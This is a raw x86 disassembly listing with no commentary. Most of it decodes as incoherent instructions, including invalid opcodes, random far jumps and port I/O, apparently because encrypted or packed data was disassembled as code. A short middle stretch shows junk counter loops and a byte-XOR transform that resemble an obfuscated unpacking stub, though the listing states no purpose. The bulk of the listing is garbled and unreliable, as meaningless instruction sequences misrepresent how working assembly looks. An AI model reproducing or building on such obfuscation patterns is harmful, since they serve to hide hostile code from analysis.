  406a55:	loopne 0x406a94
  406a57:	shl    edi,cl
  406a59:	push   ebx
  406a5a:	aam    0x8a
  406a5c:	sbb    ebx,DWORD PTR [ebx-0x2302c3aa]
  406a62:	bound  esi,QWORD PTR [edx-0x5f]
  406a65:	imul   ebp,DWORD PTR [edx+0x329a87a1],0x3b
  406a6c:	push   es
  406a6d:	mov    cs,WORD PTR [ebp-0x43c49407]
  406a73:	iret   
  406a74:	xor    eax,0xd30c66ab
  406a79:	adc    eax,esi
  406a7b:	inc    esi
  406a7c:	imul   ecx,eax,0x1435978f
  406a82:	aad    0x32
  406a84:	adc    BYTE PTR [ecx-0x56d23f88],cl
  406a8a:	loope  0x406ac0
  406a8c:	hlt    
  406a8d:	call   0x2cf6:0x536715db
  406a94:	and    BYTE PTR [edx+eax*1],cl
  406a97:	mov    eax,ds:0xa8a84196
  406a9c:	adc    al,0xe6
  406a9e:	nop
  406a9f:	add    bh,dl
  406aa1:	add    dh,0x3
  406aa4:	inc    ebp
  406aa5:	jmp    0xbee25ad7
  406aaa:	jle    0x406ae6
  406aac:	mov    ah,BYTE PTR [edx]
  406aae:	or     eax,0x537135af
  406ab3:	loope  0x406aa0
  406ab5:	push   ss
  406ab6:	adc    eax,edx
  406ab8:	arpl   bx,bx
  406aba:	int3   
  406abb:	mov    ds:0x6602f81b,eax
  406ac0:	popf   
  406ac1:	jmp    0x8506:0x5c33fbc9
  406ac8:	push   cs
  406ac9:	lahf   
  406aca:	or     BYTE PTR [eax],dh
  406acc:	push   edx
  406acd:	mov    edi,0x59226b72
  406ad2:	fs inc edx
  406ad4:	loop   0x406b02
  406ad6:	and    ebp,DWORD PTR [ebp-0x74e4c9a3]
  406adc:	imul   esp,DWORD PTR [ecx-0x4f],0xffffffea
  406ae0:	out    0xc5,eax
  406ae2:	inc    ebx
  406ae3:	push   esi
  406ae4:	xor    BYTE PTR [edx+0x4cf579f],bl
  406aea:	shr    BYTE PTR [eax],cl
  406aec:	jbe    0x406aad
  406aee:	outs   dx,BYTE PTR ds:[esi]
  406aef:	mov    ch,0x3c
  406af1:	and    bh,BYTE PTR fs:[edx]
  406af4:	mov    bh,0x61
  406af6:	sbb    BYTE PTR [esi+eax*8],0x93
  406afa:	cs sti 
  406afc:	pop    ebx
  406afd:	jmp    0xd553:0x239d78f3
  406b04:	in     al,dx
  406b05:	neg    BYTE PTR [eax]
  406b07:	xchg   esi,eax
  406b08:	scas   al,BYTE PTR es:[edi]
  406b09:	ror    DWORD PTR [ebx+ecx*1],1
  406b0c:	pop    esp
  406b0d:	test   BYTE PTR [edx+0x2],0x3
  406b11:	aas    
  406b12:	inc    eax
  406b13:	dec    esp
  406b14:	inc    ebx
  406b15:	aaa    
  406b16:	mov    BYTE PTR [ecx+0x5a359f44],0xee
  406b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b1e:	xchg   edi,eax
  406b1f:	adc    eax,DWORD PTR [eax]
  406b21:	dec    edi
  406b22:	(bad)  
  406b23:	bound  edi,QWORD PTR [esi]
  406b25:	les    eax,FWORD PTR [ecx+0x68]
  406b28:	(bad)  
  406b29:	mov    cl,0xb8
  406b2b:	jne    0x406b2c
  406b2d:	cs pusha 
  406b2f:	les    edi,FWORD PTR [ecx-0x207e31ce]
  406b35:	xchg   esi,eax
  406b36:	dec    edi
  406b37:	cmp    eax,0xd779139f
  406b3c:	cld    
  406b3d:	in     al,dx
  406b3e:	scas   eax,DWORD PTR es:[edi]
  406b3f:	adc    dl,BYTE PTR [ebp-0x31be063a]
  406b45:	and    DWORD PTR [ebx+eiz*2],0x898e97f9
  406b4c:	dec    ecx
  406b4d:	push   esp
  406b4e:	test   DWORD PTR [edi],eax
  406b50:	sbb    ebp,DWORD PTR [eax]
  406b52:	jbe    0x406b7c
  406b54:	lock adc BYTE PTR [edx-0x26],al
  406b58:	xchg   BYTE PTR [ebx],cl
  406b5a:	or     esi,edx
  406b5c:	outs   dx,WORD PTR ds:[esi]
  406b5e:	and    BYTE PTR [ebx-0x34ea6fba],al
  406b64:	inc    esi
  406b65:	push   eax
  406b66:	(bad)  
  406b68:	sub    bh,BYTE PTR [esi-0x1a171cfa]
  406b6e:	bound  esp,QWORD PTR [esi]
  406b70:	fst    QWORD PTR [edi-0x1f]
  406b73:	mov    ch,0x5
  406b75:	(bad)  
  406b77:	pop    esp
  406b78:	jno    0x406b6b
  406b7a:	cmp    eax,0xee2b0e3c
  406b7f:	imul   edx,DWORD PTR [ecx+0x44],0x40c90472
  406b86:	add    al,0xe3
  406b88:	daa    
  406b89:	scas   al,BYTE PTR es:[edi]
  406b8a:	xchg   DWORD PTR [eax+0x29],ebx
  406b8d:	mov    dl,0x76
  406b8f:	mov    ecx,0x630adb89
  406b94:	fwait
  406b95:	nop
  406b96:	pop    esi
  406b97:	aaa    
  406b98:	(bad)  
  406b99:	ficom  DWORD PTR [edi+0x6c]
  406b9c:	sti    
  406b9d:	pop    ecx
  406b9e:	xchg   ebp,eax
  406b9f:	pop    esp
  406ba0:	or     eax,0x7202b324
  406ba5:	ins    BYTE PTR es:[edi],dx
  406ba6:	sbb    BYTE PTR [ebx+0x57],ch
  406ba9:	stos   BYTE PTR es:[edi],al
  406baa:	stos   DWORD PTR es:[edi],eax
  406bab:	mov    ch,0x40
  406bad:	dec    ebp
  406bae:	outs   dx,DWORD PTR ds:[esi]
  406baf:	hlt    
  406bb0:	shl    DWORD PTR [edx],cl
  406bb2:	fcomp  QWORD PTR [ecx]
  406bb4:	dec    ecx
  406bb5:	stos   DWORD PTR es:[edi],eax
  406bb6:	std    
  406bb7:	lods   al,BYTE PTR ds:[esi]
  406bb8:	stc    
  406bb9:	add    bh,ch
  406bbb:	add    DWORD PTR [edx+0x6b1a209c],0x3b
  406bc2:	jbe    0x406b58
  406bc4:	or     bh,BYTE PTR [esi+ebx*1]
  406bc7:	xor    BYTE PTR [eax+ebp*1-0x4f],0x6d
  406bcc:	rol    DWORD PTR [edx],cl
  406bce:	pop    ebp
  406bcf:	out    0x7f,al
  406bd1:	mov    ebp,0xaab0ccfe
  406bd6:	inc    edx
  406bd7:	mov    ebp,0x1f744384
  406bdc:	imul   DWORD PTR [eax+eiz*1-0x4c]
  406be0:	in     al,0x18
  406be2:	in     al,dx
  406be3:	mov    eax,ds:0x6e3bce49
  406be8:	dec    ecx
  406be9:	jle    0x406c66
  406beb:	add    DWORD PTR [esi-0x3b],edi
  406bee:	pop    es
  406bef:	cdq    
  406bf0:	mov    esp,0x1f9c36e1
  406bf5:	push   0x57
  406bf7:	mov    edi,DWORD PTR ds:0xe3e29142
  406bfd:	mov    ebx,0xe0c91a21
  406c02:	iret   
  406c03:	sbb    eax,0xba21fa8
  406c08:	xchg   ebx,eax
  406c09:	rcr    DWORD PTR [edx+0x2224a389],cl
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	stos   DWORD PTR es:[edi],eax
  406c28:	pop    edx
  406c29:	xchg   ebx,eax
  406c2a:	add    bh,BYTE PTR [eax]
  406c2c:	retf   0x7e7e
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	xor    eax,0xac387162
  406c38:	mov    ebp,0x666c6abb
  406c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c3e:	fmul   st(3),st
  406c40:	mul    BYTE PTR [edx-0x7cd3dfb8]
  406c46:	dec    DWORD PTR [ecx-0x54b3457e]
  406c4c:	sub    DWORD PTR [esi-0xc],esp
  406c4f:	xor    al,0xb
  406c51:	pop    edx
  406c52:	stos   BYTE PTR es:[edi],al
  406c53:	or     eax,0xcb034176
  406c58:	sbb    bh,BYTE PTR [ebp-0x37]
  406c5b:	rcl    ebx,1
  406c5d:	in     al,0x8b
  406c5f:	mov    cl,0x6b
  406c61:	aam    0xd0
  406c63:	push   0xfffffff3
  406c65:	pusha  
  406c66:	enter  0x33f6,0x90
  406c6a:	es jp  0x406c85
  406c6d:	sbb    al,0xf6
  406c6f:	mov    ebx,0x7c460bcc
  406c74:	jmp    0xca3e4544
  406c79:	jno    0x406cf5
  406c7b:	sar    DWORD PTR [ebp+0x6c],0xa2
  406c7f:	call   0xff41:0x4d290c90
  406c86:	pushf  
  406c87:	and    eax,0x40e7279e
  406c8c:	clc    
  406c8d:	mov    eax,0x3268a5d0
  406c92:	mov    ecx,0x442271ce
  406c97:	pop    edx
  406c98:	out    dx,eax
  406c99:	cmp    edx,DWORD PTR [edx+eax*4-0x1f]
  406c9d:	idiv   ah
  406c9f:	xchg   edi,eax
  406ca0:	mov    ebp,0x77849f23
  406ca5:	jl     0x406c84
  406ca7:	shl    dl,1
  406ca9:	in     al,dx
  406caa:	or     DWORD PTR [ecx-0x2f],esp
  406cad:	mov    eax,0xf042d24c
  406cb2:	xchg   esp,eax
  406cb3:	retf   
  406cb4:	imul   ebx,DWORD PTR [ebx],0xfa3cc600
  406cba:	shr    esi,0xe5
  406cbd:	rcl    BYTE PTR [ebp+0x7e],1
  406cc0:	xlat   BYTE PTR ds:[ebx]
  406cc1:	jl     0x406c77
  406cc3:	or     DWORD PTR [edi+0x5b],edx
  406cc6:	lea    esp,[eax]
  406cc8:	loopne 0x406cd1
  406cca:	xchg   esp,eax
  406ccb:	or     ebx,esi
  406ccd:	fld    TBYTE PTR [esi-0x3b]
  406cd0:	enter  0x429d,0xbf
  406cd4:	sub    cl,BYTE PTR [ecx+0x2d2ae212]
  406cda:	sub    ebx,DWORD PTR [esi+0x53cba92a]
  406ce0:	enter  0x334d,0x30
  406ce4:	sbb    dl,0xfd
  406ce7:	pop    ecx
  406ce8:	pop    ebx
  406ce9:	adc    dl,BYTE PTR [ecx+0x47]
  406cec:	icebp  
  406ced:	cmp    ebx,DWORD PTR [ebx-0x46]
  406cf0:	ret    
  406cf1:	sti    
  406cf2:	sahf   
  406cf3:	adc    eax,0x427565c0
  406cf8:	fcom   QWORD PTR [ecx]
  406cfa:	imul   edx,DWORD PTR ds:0x4584f4f8,0xffffffa5
  406d01:	xchg   edx,eax
  406d02:	mov    dl,0xdb
  406d04:	or     esi,ebp
  406d06:	xor    al,bh
  406d08:	push   edx
  406d09:	ss dec ebx
  406d0b:	xor    ebx,0x58
  406d0e:	loope  0x406ce3
  406d10:	sub    DWORD PTR [esi+0x2a],0x2bf8095c
  406d17:	sti    
  406d18:	adc    BYTE PTR [edi-0x413585c5],dh
  406d1e:	cwde   
  406d1f:	jle    0x406d11
  406d21:	clc    
  406d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d23:	out    0x79,al
  406d25:	cmp    ch,dl
  406d27:	xchg   ebx,eax
  406d28:	and    ebx,ebp
  406d2a:	ret    0x68ab
  406d2d:	and    BYTE PTR [ecx+0x7a1d3ac],bh
  406d33:	test   DWORD PTR [edi],ebp
  406d35:	ds jp  0x406cee
  406d38:	adc    al,BYTE PTR gs:[edi-0x15131ff7]
  406d3f:	adc    DWORD PTR [edi+0x0],ebp
  406d42:	scas   al,BYTE PTR es:[edi]
  406d43:	xchg   esp,eax
  406d44:	mov    ebp,0x7c7884b3
  406d49:	cmc    
  406d4a:	inc    eax
  406d4b:	outs   dx,BYTE PTR ds:[esi]
  406d4c:	out    dx,eax
  406d4d:	lahf   
  406d4e:	cmp    DWORD PTR [ebx],esi
  406d50:	xor    ah,BYTE PTR ss:[eax-0x16be6a9b]
  406d57:	jle    0x406d71
  406d59:	inc    ebx
  406d5a:	stos   BYTE PTR es:[edi],al
  406d5b:	cmp    DWORD PTR [edx],0x4c
  406d5e:	xor    BYTE PTR [edx+0x36e3436b],bl
  406d64:	inc    ebx
  406d65:	mov    ebx,0xeb6172c2
  406d6a:	imul   ebx,edx,0x5feb5b5c
  406d70:	sub    dh,BYTE PTR [ebx]
  406d72:	dec    esp
  406d73:	gs (bad) 
  406d75:	pop    ecx
  406d76:	pop    ecx
  406d77:	dec    edx
  406d78:	mov    bh,0xe9
  406d7a:	ins    BYTE PTR es:[edi],dx
  406d7b:	xlat   BYTE PTR ds:[ebx]
  406d7c:	inc    ecx
  406d7d:	lea    esp,[edx-0x4b51f8f5]
  406d83:	pop    ds
  406d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d86:	xor    ebp,ebp
  406d88:	rcr    DWORD PTR [edx],1
  406d8a:	sub    dl,BYTE PTR [edx+edx*8]
  406d8d:	cbw    
  406d8f:	cmp    eax,0x602513e
  406d94:	in     al,dx
  406d95:	adc    DWORD PTR [eax+ebx*1-0x48],0x28
  406d9a:	push   edx
  406d9b:	jge    0x406d9d
  406d9d:	bound  esi,QWORD PTR [edi+0x604a799d]
  406da3:	xchg   edx,eax
  406da4:	pop    esi
  406da5:	push   esp
  406da6:	rol    DWORD PTR [ecx+0x76],1
  406da9:	push   eax
  406daa:	push   0x39
  406dac:	dec    ecx
  406dad:	adc    DWORD PTR [ecx+0x79dcdc7b],ecx
  406db3:	mov    ebx,0x1ceac990
  406db8:	imul   esi,DWORD PTR [esp+ebp*2+0x1bd283c3],0xce5a1788
  406dc3:	sbb    al,0xd4
  406dc5:	into   
  406dc6:	pop    esi
  406dc7:	jb     0x406d98
  406dc9:	dec    ecx
  406dca:	nop
  406dcb:	pusha  
  406dcc:	inc    eax
  406dcd:	(bad)  
  406dcf:	stos   BYTE PTR es:[edi],al
  406dd0:	push   es
  406dd1:	mov    ecx,0x8483204d
  406dd6:	ins    BYTE PTR es:[edi],dx
  406dd7:	push   edx
  406dd8:	xchg   ecx,eax
  406dd9:	stc    
  406dda:	dec    esi
  406ddb:	or     BYTE PTR [eax+0x388d2db8],bl
  406de1:	xchg   DWORD PTR [edi-0x20],edi
  406de4:	jg     0x406dff
  406de6:	xchg   ebp,eax
  406de7:	fsubr  QWORD PTR [ecx-0x3b]
  406dea:	or     dh,cl
  406dec:	and    al,0x2f
  406dee:	sbb    DWORD PTR [ebp-0x81b1949],eax
  406df4:	mov    ebx,0x49dac7f6
  406df9:	imul   ebp,DWORD PTR [edi-0x6ae8400],0x13
  406e00:	test   BYTE PTR [eax],dl
  406e02:	push   esi
  406e03:	add    esi,DWORD PTR [ebx+0x687b7603]
  406e09:	add    eax,0xbf4906c
  406e0e:	cmp    ch,BYTE PTR [esi]
  406e10:	inc    eax
  406e11:	or     ah,0xe9
  406e14:	push   ecx
  406e15:	ja     0x406db5
  406e17:	cmp    ebp,DWORD PTR ds:0xb91d82cc
  406e1d:	mov    ch,0xde
  406e1f:	imul   eax,ebp,0xf5a011e2
  406e25:	pop    es
  406e26:	xchg   edi,eax
  406e27:	add    BYTE PTR [ecx-0x38],bh
  406e2a:	jl     0x406dbd
  406e2c:	add    esp,DWORD PTR [edx-0x75]
  406e2f:	test   al,0xe8
  406e31:	gs hlt 
  406e33:	ret    0x25bc
  406e36:	and    eax,0x47213de
  406e3b:	and    esp,DWORD PTR [esi-0x66]
  406e3e:	ss das 
  406e40:	dec    ecx
  406e41:	adc    edx,edi
  406e43:	fmul   st(4),st
  406e45:	les    ebx,FWORD PTR [eax+0x5b567af1]
  406e4b:	ret    
  406e4c:	je     0x406df1
  406e4e:	out    0x86,al
  406e50:	sub    al,0xe7
  406e52:	add    DWORD PTR [ebx+0x5b],edi
  406e55:	ja     0x406e51
  406e57:	es call 0xace3b276
  406e5d:	inc    ebp
  406e5e:	pop    ebx
  406e5f:	push   ss
  406e60:	ret    
  406e61:	out    0x5a,al
  406e63:	add    DWORD PTR [edx+0x28],eax
  406e66:	std    
  406e67:	icebp  
  406e68:	sbb    BYTE PTR [esi+0x65],dl
  406e6b:	pop    ss
  406e6c:	aad    0x8d
  406e6e:	cdq    
  406e6f:	push   ds
  406e70:	jge    0x406ec0
  406e72:	test   al,0xc3
  406e74:	sbb    dl,ch
  406e76:	sub    al,0xb4
  406e78:	lahf   
  406e79:	xlat   BYTE PTR ds:[ebx]
  406e7a:	in     eax,dx
  406e7b:	mov    ebx,0x928ebde6
  406e80:	dec    edx
  406e81:	jecxz  0x406e52
  406e83:	mov    eax,ds:0xb5e63f59
  406e88:	dec    ecx
  406e89:	mov    esp,DWORD PTR [edx-0x4dc68037]
  406e8f:	stc    
  406e90:	shl    DWORD PTR ss:0x1786c02b,0xf1
  406e98:	and    ecx,DWORD PTR ds:0x8724ba03
  406e9e:	cld    
  406e9f:	xchg   ecx,eax
  406ea0:	test   BYTE PTR [ecx-0x2ed1957f],bh
  406ea6:	and    eax,0xe5be9cf8
  406eab:	push   es
  406eac:	nop
  406ead:	mov    eax,ds:0x3db96ed4
  406eb2:	cdq    
  406eb3:	out    dx,eax
  406eb4:	push   edi
  406eb5:	aaa    
  406eb6:	loope  0x406e5c
  406eb8:	push   cs
  406eb9:	or     DWORD PTR [esi+0x66],0x4f
  406ebd:	sub    cl,BYTE PTR [ebx+esi*2-0x4a5f0936]
  406ec4:	sahf   
  406ec5:	push   ds
  406ec6:	add    eax,0xa50c82bf
  406ecb:	mov    ?,WORD PTR [edi+0x46]
  406ece:	mov    edi,0x9d1a9331
  406ed3:	sbb    ch,cl
  406ed5:	adc    DWORD PTR [ebp-0x6505f7d9],eax
  406edb:	or     BYTE PTR [ebp+0x339581b],cl
  406ee1:	jmp    0xfbee328f
  406ee6:	in     al,dx
  406ee7:	inc    esi
  406ee8:	push   edx
  406ee9:	xlat   BYTE PTR ds:[ebx]
  406eea:	(bad)  
  406eeb:	gs (bad) 
  406eed:	mov    dh,0xcd
  406eef:	retf   0x2887
  406ef2:	jne    0x406e8e
  406ef4:	adc    eax,0x3e6672dc
  406ef9:	push   ebp
  406efa:	jp     0x406f00
  406efc:	fwait
  406efd:	rol    bl,1
  406eff:	addr16 inc ebp
  406f01:	mov    al,ds:0xf04521ab
  406f06:	add    BYTE PTR [edx+eax*2],ch
  406f09:	ret    0xdd8c
  406f0c:	jnp    0x406f1e
  406f0e:	sti    
  406f0f:	mov    WORD PTR [eax-0x18],fs
  406f12:	push   ss
  406f13:	outs   dx,BYTE PTR ds:[esi]
  406f14:	pop    edx
  406f15:	das    
  406f16:	mov    dh,0x6d
  406f18:	push   eax
  406f19:	das    
  406f1a:	mov    ah,0x4c
  406f1c:	inc    ecx
  406f1d:	jl     0x406f35
  406f1f:	mov    dh,0xaf
  406f21:	pop    edi
  406f22:	aaa    
  406f23:	pushf  
  406f24:	mov    cl,0xae
  406f26:	dec    ebx
  406f27:	xor    eax,0xd2fcad07
  406f2c:	sub    eax,0xb208a52c
  406f31:	inc    edi
  406f32:	shl    ecx,1
  406f34:	xchg   ebx,eax
  406f35:	enter  0x6cc0,0x86
  406f39:	sar    dl,0xd7
  406f3c:	(bad)  
  406f3d:	fsubr  st,st(3)
  406f3f:	jmp    0x38dc:0x77bfa062
  406f46:	jae    0x406f55
  406f48:	sbb    ecx,0x9c348cb8
  406f4e:	or     edi,edi
  406f50:	pop    ds
  406f51:	(bad)  
  406f52:	cwde   
  406f53:	jp     0x406f01
  406f55:	inc    ebp
  406f56:	stos   BYTE PTR es:[edi],al
  406f57:	fst    QWORD PTR [ecx+0x4d6e537f]
  406f5d:	mov    bh,0x7
  406f5f:	popf   
  406f60:	sub    BYTE PTR [edx-0xb],cl
  406f63:	stos   DWORD PTR es:[edi],eax
  406f64:	adc    ebp,DWORD PTR [edx]
  406f66:	xor    bl,BYTE PTR [edx]
  406f68:	lods   eax,DWORD PTR ds:[esi]
  406f69:	mov    bl,0x38
  406f6b:	add    BYTE PTR [eax-0x7],ah
  406f6e:	test   BYTE PTR [ebx+0x7],ch
  406f71:	push   ebx
  406f72:	mov    al,0x94
  406f74:	stos   BYTE PTR es:[edi],al
  406f75:	in     eax,dx
  406f76:	cmp    edx,ebx
  406f78:	adc    eax,DWORD PTR [ebx-0x62ff985e]
  406f7e:	(bad)  
  406f7f:	mov    edx,0x39cb461e
  406f84:	sub    ah,dh
  406f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f87:	loope  0x406ff7
  406f89:	mov    eax,0xf8959189
  406f8e:	pop    edx
  406f8f:	in     al,dx
  406f90:	adc    edi,esi
  406f92:	push   edi
  406f93:	ins    BYTE PTR es:[edi],dx
  406f94:	xor    eax,0xcf29a5cb
  406f99:	stos   DWORD PTR es:[edi],eax
  406f9a:	shl    BYTE PTR [ebx],1
  406f9c:	inc    ecx
  406f9d:	gs into 
  406f9f:	cmp    DWORD PTR [ebx],eax
  406fa1:	ret    0x2ca3
  406fa4:	and    al,BYTE PTR [ecx+0x0]
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430616,0x19
  406fd8:	cmp    DWORD PTR ds:0x430616,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430616,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42ec44
  406ffd:	cmp    DWORD PTR ds:0x430616,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430616
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430616,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430616
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430616,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x4306d6,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x4306ca,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ef98,0x42efa0
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ef90,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ef9c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ef9c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ef9c,ecx
  407083:	cmp    DWORD PTR ds:0x42ef9c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42ed24
  4070a9:	cmp    DWORD PTR ds:0x42ef9c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ef9c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ef9c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ef9c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x4306da,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42efa8,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42efa8
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42efa8,ecx
  4070fe:	cmp    DWORD PTR ds:0x42efa8,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42efa8,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42efa4
  407123:	call   DWORD PTR ds:0x42ed28
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x43063a
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430612,0x17
  407147:	cmp    DWORD PTR ds:0x430612,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430612,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42eb84
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430612
  407179:	dec    eax
  40717a:	mov    ds:0x430612,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0xfd6b12d8
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x4071b1
  4071b2:	pop    ds
  4071b3:	data16 xor dl,BYTE PTR [edi]
  4071b6:	gs into 
  4071b8:	and    cl,BYTE PTR [ebp-0x64215436]
  4071be:	out    dx,al
  4071bf:	dec    ebp
  4071c0:	and    eax,0xab47716
  4071c5:	jbe    0x407229
  4071c7:	cmp    ecx,DWORD PTR fs:[ebp+eax*8-0x52f9a485]
  4071cf:	out    0xeb,al
  4071d1:	fild   WORD PTR [edi+0x3b6062a9]
  4071d7:	aaa    
  4071d8:	pop    ebx
  4071d9:	ret    
  4071da:	sub    bh,BYTE PTR [esi]
  4071dc:	div    DWORD PTR [ecx+0x0]
  4071df:	push   es
  4071e0:	(bad)  
  4071e1:	cdq    
  4071e2:	sub    ah,BYTE PTR [ecx-0x6ca34044]
  4071e8:	jmp    DWORD PTR [ebp+0x5f]
  4071eb:	jnp    0x4071ed
  4071ed:	pop    esp
  4071ee:	ins    BYTE PTR es:[edi],dx
  4071ef:	imul   eax,DWORD PTR [eax+0x1a],0x26
  4071f3:	sbb    DWORD PTR [ebx-0x75d21df7],eax
  4071f9:	fimul  WORD PTR [edx+0x33b29c7a]
  4071ff:	popf   
  407200:	dec    edi
  407201:	add    BYTE PTR [eax-0x6],dh
  407204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407205:	scas   eax,DWORD PTR es:[edi]
  407206:	lea    ebp,[ebx]
  407208:	pop    esi
  407209:	imul   esi,DWORD PTR [edx],0xffffffc5
  40720c:	adc    ecx,eax
  40720e:	fnstsw WORD PTR [ebx-0x5e82d0ce]
  407214:	repz and ecx,DWORD PTR [ecx+0x5ab8730b]
  40721b:	dec    esp
  40721c:	aaa    
  40721d:	add    BYTE PTR [edi+0x660f9278],dh
  407223:	mov    ecx,0x5aae40cb
  407228:	sbb    al,BYTE PTR [edi+0x3bb88fed]
  40722e:	xor    al,0xf4
  407230:	mul    edx
  407232:	nop
  407233:	sub    ch,cl
  407235:	je     0x407227
  407237:	adc    dl,BYTE PTR [eax+0x6d47d941]
  40723d:	pop    esp
  40723e:	fadd   DWORD PTR [eax-0x2d]
  407241:	or     al,0x6d
  407243:	imul   esi,DWORD PTR [esp+ecx*1+0x25],0x3d24546a
  40724b:	xchg   ecx,eax
  40724c:	mov    ch,0xc5
  40724e:	xchg   DWORD PTR [esi+0x6bc982f3],eax
  407254:	ss mov dh,ah
  407257:	mov    ebx,0x858ee556
  40725c:	rcl    ecx,0xff
  40725f:	or     BYTE PTR [esi+0x28],0xc6
  407263:	js     0x407231
  407265:	or     eax,0xd0564121
  40726a:	and    DWORD PTR [ebp+0xf],esp
  40726d:	or     cl,0xbc
  407270:	rcl    dh,cl
  407272:	mov    dl,0xff
  407274:	rol    BYTE PTR [edi+0x5e],1
  407277:	sub    eax,0x86004d0f
  40727c:	sbb    ebx,DWORD PTR [eax]
  40727e:	jo     0x40721c
  407280:	mov    esp,0x1c7ad98a
  407285:	xchg   ebp,eax
  407286:	das    
  407287:	or     al,0xd
  407289:	fstp   st(6)
  40728b:	(bad)  
  40728d:	mov    dl,0xa9
  40728f:	sahf   
  407290:	dec    ebp
  407291:	jne    0x40725c
  407293:	mov    esp,0x157edc15
  407298:	pushf  
  407299:	mov    ds:0x13733c56,eax
  40729e:	pop    ebp
  40729f:	popa   
  4072a0:	or     BYTE PTR [esi-0xd6c6c48],bl
  4072a6:	out    0x17,eax
  4072a8:	int    0xfa
  4072aa:	adc    DWORD PTR [ebx],esp
  4072ac:	pop    esp
  4072ad:	jecxz  0x4072e3
  4072af:	out    0x56,al
  4072b1:	add    eax,0x8c5944fe
  4072b6:	push   esp
  4072b7:	mov    al,0x48
  4072b9:	jo     0x4072e5
  4072bb:	adc    edi,DWORD PTR [edx-0x7cda6865]
  4072c1:	add    al,0xd2
  4072c3:	(bad)  
  4072c4:	in     al,dx
  4072c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072c6:	test   al,0xf
  4072c8:	xor    eax,0x6e23bbf4
